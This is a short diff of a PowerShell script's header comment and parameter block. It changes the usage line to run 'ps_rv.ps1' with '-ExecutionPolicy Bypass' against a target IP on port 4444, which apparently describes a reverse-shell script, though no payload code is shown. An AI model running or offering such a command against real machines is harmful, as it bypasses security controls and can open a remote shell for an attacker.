@@ -1,4 +1,4 @@
-# .\Skript.ps1 -TargetIP "10.6.36.88" -TargetPort 4444
+# powershell -ExecutionPolicy Bypass -File .\ps_rv.ps1 -TargetIP "10.6.36.88" -TargetPort 4444
 
 param (
     [Parameter(Mandatory=$true)]
